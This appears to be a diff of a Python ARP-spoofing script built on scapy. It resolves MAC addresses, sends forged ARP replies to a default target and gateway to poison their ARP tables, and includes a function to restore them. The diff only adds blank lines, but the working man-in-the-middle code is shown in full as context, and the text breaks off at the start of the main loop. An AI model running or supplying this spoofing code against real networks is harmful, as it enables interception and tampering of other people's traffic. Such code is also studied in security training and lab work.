@@ -2,6 +2,7 @@ import scapy.all as scapy
 import time
 import argparse
 
+
 def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target", dest="target", default="172.16.13.110", help="Target IP")
@@ -9,6 +10,8 @@ def get_arguments():
     args = parser.parse_args()
     return args.target, args.gateway
 # Get target mac address using ip address
+
+
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -17,18 +20,24 @@ def get_mac(ip):
     print(answered_list)  # Add this line to see what answered_list contains
     return answered_list[0][1].hwsrc if answered_list else None
 # Change mac address in arp table
+
+
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                        psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 # Restore mac address in arp table
+
+
 def restore(dest_ip, source_ip):
     dest_mac = get_mac(dest_ip)
     source_mac = get_mac(source_ip)
     packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                        psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
+
+    
 options = get_arguments()
 sent_packets_count = 0
 try:
